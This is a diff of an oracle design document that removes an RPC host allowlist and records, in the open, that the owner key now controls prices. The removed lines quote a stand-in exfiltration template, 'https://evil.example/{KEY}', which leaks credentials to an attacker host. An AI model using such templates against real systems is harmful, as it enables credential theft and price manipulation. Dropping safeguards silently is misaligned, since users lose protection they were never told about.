@@ -71,10 +71,10 @@ the extension checks itself.</p>
   <tbody>
     <tr><td>USDX contract list, per chain</td><td>Per the implementation's recorded decision, <b>the contract list <i>is</i> the exclusion policy</b> — there is no separate exclusion list. It must match the basis on which Hex reports reserves.</td></tr>
     <tr><td>Chain IDs, quorum, finality margins</td><td>The integrity rule itself. A configurable "quorum = 1" silently removes redundancy — note Songbird deliberately <i>is</i> 1.</td></tr>
-    <tr><td><b>Permitted RPC host allowlist</b></td><td>§5 — what stops runtime endpoint config becoming a substitution or exfiltration channel.</td></tr>
+    <tr><td><b>No RPC host allowlist</b></td><td>Deliberately absent — §5. Endpoints are unconstrained, so the owner key is price-controlling by decision (Findings §15).</td></tr>
     <tr><td><b>Admin signer set + threshold</b></td><td>§4 — who may set credentials. Baking it means the answer is publicly verifiable without an on-chain contract.</td></tr>
     <tr><td>Hex API base URLs and paths</td><td>Where reserves come from is part of what the oracle is.</td></tr>
-    <tr><td>Haircut (0), output decimals, feed ID, store address, target chain ID</td><td>Bound into the signed report, or directly answer-determining.</td></tr>
+    <tr><td>Haircut (0), output decimals</td><td>Directly answer-determining. The signed report carries no target binding — removed pre-launch (Findings §16).</td></tr>
     <tr><td>Plausibility bounds, <code>MaxAge</code>, freshness windows</td><td>Belt-and-braces beside the store's own bounds.</td></tr>
   </tbody>
 </table>
@@ -82,7 +82,7 @@ the extension checks itself.</p>
 <h3 class="t2" style="padding:.2em .4em">Endpoints — on-chain instruction, plaintext</h3>
 <table>
   <tbody>
-    <tr><td style="width:15em">RPC endpoint descriptors, per chain</td><td>Endpoints churn — three we surveyed died within weeks. Constrained by the baked host allowlist.</td></tr>
+    <tr><td style="width:15em">RPC endpoint descriptors, per chain</td><td>Endpoints churn — three we surveyed died within weeks. Unconstrained: any https host is accepted, which is exactly why the owner key is trusted (§5, Findings §15).</td></tr>
     <tr><td>Per-provider enable / disable</td><td>Operational response to a flaky provider without a rebuild.</td></tr>
     <tr><td>Timeouts, consistency window</td><td>Tuning. Cannot change <i>what</i> is measured.</td></tr>
   </tbody>
@@ -169,7 +169,7 @@ set requires a new code version, which is correct for something this privileged.
 <p><b>Open:</b> M-of-N values. Suggest 2-of-3 to start — one signer being unavailable must not block an
 emergency rotation, and one signer being compromised must not permit one.</p>
 
-<h2>5. Endpoints on-chain, and why the host allowlist is load-bearing</h2>
+<h2>5. Endpoints on-chain, and why there is deliberately no host allowlist</h2>
 
 <p>Many RPC providers embed the credential <i>in the URL</i> —
 <code>https://&lt;sub&gt;.quiknode.pro/&lt;key&gt;/</code>, <code>rpc.ankr.com/flare/&lt;key&gt;</code>,
@@ -186,16 +186,24 @@ while the credential never appears anywhere public. Unkeyed endpoints carry no p
 credential.</p>
 
 <div class="verdict warn">
-<b>A template with a placeholder can exfiltrate.</b> <code>"https://evil.example/{KEY}"</code> mails the
-credential out on the next update; <code>"https://evil.example/rpc"</code> substitutes the data itself, and
-quorum does not help if one attacker supplies every provider. The <b>baked host allowlist</b> is what makes
-on-chain endpoint config safe: reject any template whose host is not compiled in. Pair it with a
-<b>diversity rule</b> — a chain's providers must span <i>k</i> distinct operators — so a "redundant" set
-cannot be three URLs at one provider.
+<b>There is deliberately no host allowlist.</b> An earlier build baked one; it was
+removed so that adding a provider (Alchemy, say) or moving from 2-of-3 to 2-of-4
+needs no rebuild and no re-attestation. The consequence, accepted on purpose:
+whoever holds the <code>setEndpoints</code> owner key can name <i>any</i> https
+host — including one they control — and any threshold, and the attested code will
+faithfully compute and sign the resulting price. The feed is therefore only as
+trustworthy as the owner key as well as the TEE (Findings §15); the planned
+diversity rule (<i>k</i> distinct operators per chain) was not implemented either.
+What still holds regardless of host choice: https only; redirects are never
+followed, so an honest host cannot bounce a credential to a third party;
+<code>{secret}</code> may not appear in a URL's scheme or host; thresholds are
+bounded by the provider count. A hostile host named directly in a template is
+the owner's choice, covered by the trust statement above.
 </div>
-<p>This is also finding 2's territory: a redirect can hand the credential to a third party. <b>Disable
-redirect following</b> on any request carrying a credential, or re-validate the destination host against the
-same allowlist before following.</p>
+<p>This is also finding 2's territory: a redirect can hand the credential to a
+third party. The implementation never follows redirects on these requests, so the
+only way a credential reaches a hostile host is if the owner named that host in
+the template.</p>
 
 <h2>6. Should the credential still be encrypted?</h2>
 
@@ -271,15 +279,16 @@ price and a correctly-configured par price look identical from outside; the bann
   <thead><tr><th style="width:13em">Operation</th><th>Channel</th><th>Authorised by</th></tr></thead>
   <tbody>
     <tr><td><code>requestPriceUpdate()</code></td><td>on-chain</td><td>anyone, with a cooldown — liveness benefits from being permissionless</td></tr>
-    <tr><td><code>setEndpoints(teeId, cfg)</code></td><td>on-chain</td><td><b>owner only</b>, constrained by the baked host allowlist; consider a timelock so observers can react to a wrong-looking set</td></tr>
+    <tr><td><code>setEndpoints(teeId, cfg)</code></td><td>on-chain</td><td><b>owner only</b>. No host allowlist — the owner is price-controlling by decision (Findings §15); consider a multisig or timelock so observers can react to a wrong-looking set</td></tr>
     <tr><td><code>SET_SECRET</code></td><td><b>direct</b></td><td><b>M-of-N admin signatures</b>, verified by the extension; rejected outright if it arrives as an on-chain instruction</td></tr>
   </tbody>
 </table>
 
 <h2>9. What a third party can verify</h2>
 <ul>
-  <li><b>Which token contracts, on which chains</b>, and the price rule, quorum policy and host allowlist — from the image.</li>
-  <li><b>Which RPC providers are in use</b>, and that they come from the pinned allowlist — from the instruction history plus the image.</li>
+  <li><b>Which token contracts, on which chains</b>, and the price rule and quorum policy — from the image.</li>
+  <li><b>Which RPC providers are in use</b> — from the instruction history. There is no allowlist to check
+  them against: trusting the providers means trusting the owner key (Findings §15).</li>
   <li><b>Who is permitted to set credentials</b> — from the image, since the admin set is baked.</li>
   <li><b>That the operator never saw the credentials</b> — from attestation plus ECIES, provided §6's recommendation stands.</li>
 </ul>
@@ -291,7 +300,8 @@ see <a href="usdx-oracle-reference.html">Findings §1</a>.</p>
   <li>Config loader — the blocker in finding 12. Baked config struct, then endpoint and credential stores.</li>
   <li><code>USDX_CONFIG</code> op type: <code>SET_ENDPOINTS</code> (instruction) and <code>SET_SECRET</code> (direct).</li>
   <li>Envelope encode/decode, signature recovery, the eight checks, distinctness of signers.</li>
-  <li>Host allowlist + diversity validation; redirect handling per finding 2.</li>
+  <li><s>Host allowlist + diversity validation</s> — dropped by decision (Findings §15); redirect handling per
+  finding 2 is implemented: redirects are never followed.</li>
   <li>Readiness state, <code>not_configured</code> error class, <code>/state</code> booleans, alert.</li>
   <li>Provisioning CLI — wrap <code>teesecret</code>, build and sign envelopes, submit to <code>/direct-instruction</code>.</li>
   <li>Construct <code>oracle.Runner</code> in <code>cmd/docker</code>; regenerate conformance fixtures against the real payload.</li>
@@ -305,7 +315,8 @@ see <a href="usdx-oracle-reference.html">Findings §1</a>.</p>
   <li>Threshold minus one signature is rejected; the same signature repeated to reach the threshold is rejected.</li>
   <li>An expired <code>issuedAt</code> is rejected even at version 1 on a fresh process (the restart-replay case).</li>
   <li>A failed <code>SET_SECRET</code> emits no value, length, or hostname in <code>Log</code> — same assertion style as finding 1's.</li>
-  <li>An endpoint template with an off-allowlist host is rejected.</li>
+  <li>Any https host is accepted — <code>TestAnyHostIsAccepted</code> pins the no-allowlist decision, so
+  reintroducing a constraint means changing a named test.</li>
 </ul>
 
 <h2>11. Open questions</h2>
